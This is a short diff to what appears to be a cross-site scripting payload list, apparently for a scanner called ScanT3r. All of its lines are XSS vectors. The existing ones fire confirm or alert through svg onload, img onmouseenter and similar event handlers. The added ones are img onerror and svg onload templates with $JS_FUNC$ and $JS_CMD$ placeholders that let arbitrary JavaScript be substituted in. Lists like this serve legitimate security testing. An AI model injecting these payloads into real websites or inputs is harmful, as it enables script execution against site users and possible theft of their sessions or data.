@@ -2,4 +2,7 @@
 ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
 "><img src=x OnMouseEnter=(confirm)(1)>ScanT3r
 "><div onpointermove="alert(45)">MOVE HERE</div>'
+<iMg src=a oNerrOr=$JS_FUNC$($JS_CMD$)>
+<img src=x onerror=$JS_FUNC$`$JS_CMD$`>
+<svg/onload=$JS_FUNC$`$JS_CMD$`>
 <x/oncopy=brrrr>
